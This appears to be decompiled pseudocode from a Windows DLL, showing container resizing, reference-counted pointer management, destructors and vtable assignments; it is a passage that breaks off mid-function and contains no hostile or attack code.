int *__thiscall sub_10040898(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_100414AB(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (100408DA) --------------------------------------------------------
void *__thiscall sub_100408DA(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_10095258;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_100414AB(v2);
  this[3] = 0;
  v5 = -1;
  return sub_1003D70F(this);
}
// 10095258: using guessed type int (__thiscall *off_10095258)(void *Block, char);

//----- (1004093B) --------------------------------------------------------
int __thiscall sub_1004093B(_DWORD *this)
{
  return this[1];
}

//----- (1004093F) --------------------------------------------------------
_DWORD *__thiscall sub_1004093F(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B667B);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_10041949((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_10041949((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (100409A5) --------------------------------------------------------
int __thiscall sub_100409A5(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (100409BD) --------------------------------------------------------
int __thiscall sub_100409BD(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B667C);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_10041949((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10041949((_DWORD *)(this[3] + 8 * v4), dword_100BFAA8);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BFAA8: using guessed type _DWORD dword_100BFAA8[2];

//----- (10040A14) --------------------------------------------------------
int __thiscall sub_10040A14(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B667D);
  return this[3] + 8 * a2;
}

//----- (10040A32) --------------------------------------------------------
int __thiscall sub_10040A32(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B667E);
  return this[3] + 8 * a2;
}

//----- (10040A50) --------------------------------------------------------
char *__thiscall sub_10040A50(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_100414AB(v3);
  }
  return result;
}

//----- (10040A76) --------------------------------------------------------
int __thiscall sub_10040A76(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_100414AB(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10040A9D) --------------------------------------------------------
BOOL __thiscall sub_10040A9D(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10040AA8) --------------------------------------------------------
int __thiscall sub_10040AA8(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_10041949((_DWORD *)(this[3] + 8 * i), dword_100BFAA8);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BFAA8: using guessed type _DWORD dword_100BFAA8[2];

//----- (10040AF2) --------------------------------------------------------
unsigned int __thiscall sub_10040AF2(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B667F);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10040B64) --------------------------------------------------------
unsigned int __thiscall sub_10040B64(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10040B8C) --------------------------------------------------------
unsigned int __stdcall sub_10040B8C(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10040B9D) --------------------------------------------------------
unsigned int __thiscall sub_10040B9D(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_100414C9, sub_1004081F);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_10041949((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10040C4D) --------------------------------------------------------
void *__thiscall sub_10040C4D(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_100792F3;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_100414C9, sub_1004081F);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_10041949(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_100414AB(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10040D77) --------------------------------------------------------
_DWORD *__userpurge sub_10040D77@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10040DBB) --------------------------------------------------------
void __thiscall sub_10040DBB(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041A27((int)this);
}

//----- (10040E0E) --------------------------------------------------------
_DWORD *__userpurge sub_10040E0E@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10040E52) --------------------------------------------------------
void __thiscall sub_10040E52(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041A61((int)this);
}

//----- (10040E91) --------------------------------------------------------
_DWORD *__userpurge sub_10040E91@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10040ED5) --------------------------------------------------------
void __thiscall sub_10040ED5(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041A89((int)this);
}

//----- (10040F22) --------------------------------------------------------
_DWORD *__userpurge sub_10040F22@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10040F66) --------------------------------------------------------
void __thiscall sub_10040F66(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041AC3((int)this);
}

//----- (10040FB9) --------------------------------------------------------
_DWORD *__userpurge sub_10040FB9@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10040FFD) --------------------------------------------------------
void __thiscall sub_10040FFD(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041AFD((int)this);
}

//----- (10041050) --------------------------------------------------------
_DWORD *__userpurge sub_10041050@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10041094) --------------------------------------------------------
void __thiscall sub_10041094(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041B37((int)this);
}

//----- (100410E7) --------------------------------------------------------
_DWORD *__userpurge sub_100410E7@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004112B) --------------------------------------------------------
void __thiscall sub_1004112B(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041B71((int)this);
}

//----- (1004117E) --------------------------------------------------------
_DWORD *__userpurge sub_1004117E@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100411C2) --------------------------------------------------------
void __thiscall sub_100411C2(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041BAB((int)this);
}

//----- (10041215) --------------------------------------------------------
_DWORD *__userpurge sub_10041215@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10041259) --------------------------------------------------------
void __thiscall sub_10041259(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041BE5((int)this);
}

//----- (100412AC) --------------------------------------------------------
_DWORD *__userpurge sub_100412AC@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100412F0) --------------------------------------------------------
void __thiscall sub_100412F0(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041C1F((int)this);
}

//----- (10041343) --------------------------------------------------------
_DWORD *__userpurge sub_10041343@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10041387) --------------------------------------------------------
void __thiscall sub_10041387(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10041C59((int)this);
}

//----- (100413C6) --------------------------------------------------------
void *__thiscall sub_100413C6(void *Block, char a2)
{
  sub_1003F17B((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100413E2) --------------------------------------------------------
_DWORD *__thiscall sub_100413E2(_DWORD *Block, char a2)
{
  sub_1003F565(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100413FE) --------------------------------------------------------
int __thiscall sub_100413FE(void *this)
{
  return sub_100099CF((int)this, 0);
}

//----- (10041407) --------------------------------------------------------
_DWORD *__thiscall sub_10041407(_DWORD *Block, char a2)
{
  sub_1003FAE1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10041423) --------------------------------------------------------
_DWORD *__thiscall sub_10041423(_DWORD *Block, char a2)
{
  sub_1003FDB6(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004143F) --------------------------------------------------------
_DWORD *__thiscall sub_1004143F(_DWORD *this)
{
  return sub_1000ABCD(this);
}

//----- (10041449) --------------------------------------------------------
_DWORD *__thiscall sub_10041449(_DWORD *Block, char a2)
{
  sub_10040382(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10041465) --------------------------------------------------------
char *__usercall sub_10041465@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_10040283);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (10041483) --------------------------------------------------------
_DWORD *__thiscall sub_10041483(_DWORD *this)
{
  return sub_1004023F(this, 0);
}

//----- (1004148F) --------------------------------------------------------
_DWORD *__thiscall sub_1004148F(_DWORD *Block, char a2)
{
  sub_100408DA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100414AB) --------------------------------------------------------
char *__usercall sub_100414AB@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_1004081F);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (100414C9) --------------------------------------------------------
_DWORD *__thiscall sub_100414C9(_DWORD *this)
{
  return sub_10041905(this, 0);
}

//----- (100414D5) --------------------------------------------------------
_DWORD *__stdcall sub_100414D5(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100952F0;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100952F0: using guessed type int (__thiscall *off_100952F0)(void *Block, char);

//----- (10041504) --------------------------------------------------------
_DWORD *__stdcall sub_10041504(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_1009554C;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009554C: using guessed type int (__thiscall *off_1009554C)(void *Block, char);

//----- (10041543) --------------------------------------------------------
_DWORD *__stdcall sub_10041543(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10095624;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095624: using guessed type int (__thiscall *off_10095624)(void *Block, char);

//----- (10041572) --------------------------------------------------------
_DWORD *__stdcall sub_10041572(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_1009569C;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009569C: using guessed type int (__thiscall *off_1009569C)(void *Block, char);

//----- (100415B9) --------------------------------------------------------
void __usercall sub_100415B9(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100415E1) --------------------------------------------------------
_DWORD *__usercall sub_100415E1@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *result; // eax

  result = &loc_100792DF;
  if ( *a1 != a2 )
  {
    sub_1000AF7E((int)a1);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    a1[1] = result;
    *a1 = a2;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004163D) --------------------------------------------------------
_DWORD *__userpurge sub_1004163D@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  int v5; // [esp-4h] [ebp-14h]

  sub_10041C81(a2);
  *a2 = &off_10095380;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1003F410(a2, v2, v4, v5);
  return a2;
}
// 10095380: using guessed type int (__thiscall *off_10095380)(void *Block, char);

//----- (10041691) --------------------------------------------------------
_DWORD *__stdcall sub_10041691(_DWORD *a1)
{
  unsigned int i; // eax

  sub_10041C81(a1);
  *a1 = &off_10095380;
  for ( i = 1; i < 0xA; i *= 2 )
    ;
  sub_10041CE9(i, a1);
  return a1;
}
// 10095380: using guessed type int (__thiscall *off_10095380)(void *Block, char);

//----- (100416D3) --------------------------------------------------------
_DWORD *__userpurge sub_100416D3@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  void *v5; // [esp-4h] [ebp-14h]

  sub_10041CB0(a2);
  *a2 = &off_100953E0;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1003F8B6(a2, v2, v4, v5);
  return a2;
}
// 100953E0: using guessed type int (__thiscall *off_100953E0)(void *Block, char);

//----- (10041727) --------------------------------------------------------
_DWORD *__stdcall sub_10041727(_DWORD *a1)
{
  unsigned int i; // esi

  sub_10041CB0(a1);
  *a1 = &off_100953E0;
  for ( i = 1; i < 0xA; i *= 2 )
    ;
  sub_10041D09(a1, i);
  return a1;
}
// 100953E0: using guessed type int (__thiscall *off_100953E0)(void *Block, char);

//----- (1004176B) --------------------------------------------------------
int __userpurge sub_1004176B@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (100417EC) --------------------------------------------------------
void __usercall sub_100417EC(_DWORD *a1@<edi>, unsigned int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 8u, a2, (void (__thiscall *)(void *))sub_1004143F, sub_1000AC0D);
  }
  a1[3] = v2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1004186B) --------------------------------------------------------
void __usercall sub_1004186B(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041893) --------------------------------------------------------
void __usercall sub_10041893(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x84u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(v2 + 1, 8u, 16, (void (__thiscall *)(void *))sub_10041483, sub_10040283);
  }
  a1[3] = v1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10041905) --------------------------------------------------------
_DWORD *__userpurge sub_10041905@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10041949) --------------------------------------------------------
_DWORD *__usercall sub_10041949@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10041980((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10041980) --------------------------------------------------------
void __usercall sub_10041980(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100419A8) --------------------------------------------------------
void __usercall sub_100419A8(_DWORD *a1@<edi>, unsigned int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 8u, a2, (void (__thiscall *)(void *))sub_100414C9, sub_1004081F);
  }
  a1[3] = v2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10041A27) --------------------------------------------------------
void __usercall sub_10041A27(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041A61) --------------------------------------------------------
void __usercall sub_10041A61(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10041A89) --------------------------------------------------------
void __usercall sub_10041A89(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
